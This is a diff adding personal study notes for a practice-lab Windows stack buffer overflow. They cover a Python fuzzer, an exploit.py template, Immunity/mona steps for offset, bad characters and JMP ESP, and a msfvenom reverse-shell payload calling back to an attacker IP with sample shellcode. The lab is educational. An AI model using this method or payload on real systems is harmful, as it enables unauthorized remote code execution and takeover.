@@ -1,0 +1,124 @@
+Remote Desktop Command: xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea
+
+
+Windows BoF:
+
+1 - Right-click the Immunity Debugger icon on the Desktop and choose "Run as administrator".
+2 - When Immunity loads, click the open file icon, or choose File -> Open. Navigate to the vulnerable app click "Open".
+    - For service, attach instead of open file
+3 - The binary will open in a "paused" state, so click the red play icon or choose Debug -> Run
+4 - Look at the binary that is running outside of Immunity and see what it says. In our practice, we saw that it was running on port 1337
+
+5 - Mona Config 
+    - Configure a working folder: !mona config -set workingfolder c:\mona\%p
+6 - Fuzzer.py
+    -----------------------------------------------------------
+    #!/usr/bin/env python3
+
+    import socket, time, sys
+
+    ip = "10.10.65.26"
+
+    port = 1337
+    timeout = 5
+    prefix = "OVERFLOW1 "
+
+    string = prefix + "A" * 100
+
+    while True:
+      try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+          s.settimeout(timeout)
+          s.connect((ip, port))
+          s.recv(1024)
+          print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+          s.send(bytes(string, "latin-1"))
+          s.recv(1024)
+      except:
+        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+        sys.exit(0)
+      string += 100 * "A"
+      time.sleep(1)
+    -----------------------------------------------------------
+
+7 - Run the above and take note of where fuzzing crashed (the program will tell you)
+
+8 - exploit.py
+    -----------------------------------------------------------
+    import socket
+
+    ip = "10.10.65.26"
+    port = 1337
+
+    prefix = "OVERFLOW1 "
+    offset = 0
+    overflow = "A" * offset
+    retn = ""
+    padding = ""
+    payload = ""
+    postfix = ""
+
+    buffer = prefix + overflow + retn + padding + payload + postfix
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+      s.connect((ip, port))
+      print("Sending evil buffer...")
+      s.send(bytes(buffer + "\r\n", "latin-1"))
+      print("Done!")
+    except:
+      print("Could not connect.")
+    -----------------------------------------------------------
+
+9 - Run the following command: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
+    - Make the length 400 longer than the crash length
+         - alt: msf-pattern_create -l 4379
+    - Copy the output and place it into the payload variable of the exploit.py script.
+
+10 - On Windows, in Immunity Debugger, re-open the exe again using the same method as before, and click the red play icon to get it running.
+
+11 - On Kali, run the modified exploit.py script: python3 exploit.py. The script should crash the oscp.exe server again.
+
+12 - In immunity debugger run: !mona findmsp -distance 600
+   - Distance is whatever length you have specified before. 
+   - Look for EIP contains normal pattern : ... (offset XXXX) in the output
+   - Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".
+   - Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).
+
+13 - Find bad char
+   - generate a string of bad chars that is identical to the bytearray: !mona bytearray -b "\x00"
+   - Generate a char list: The following python script can be used to generate a string of bad chars from \x01 to \xff:
+     -----------------------------------------------------------
+     for x in range(1, 256):
+       print("\\x" + "{:02x}".format(x), end='')
+     print()
+     -----------------------------------------------------------
+   - Update your exploit.py script and set the payload variable to the string of bad chars the script generates.
+   - Restart oscp.exe in Immunity and run the modified exploit.py script again. Make a note of the address to which the ESP register points and use it in the following mona command:
+     - !mona compare -f C:\mona\oscp\bytearray.bin -a <address>
+   - The first badchar in the list should be the null byte (\x00) (must include it)    
+   - Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.
+   - Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.
+
+14 - Find Jump Point 
+   - With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):
+   - !mona jmp -r esp -cpb "\x00 and the rest of the bad char"
+   - Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.
+
+15 - Generate Payload 
+   - msfvenom -p windows/shell_reverse_tcp LHOST=10.6.55.214 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f c  
+   - example: payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
+"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
+...
+"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
+"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
+
+16 - Add nops: padding = "\x90" * 16
+   
+  
+
+
+
+
+
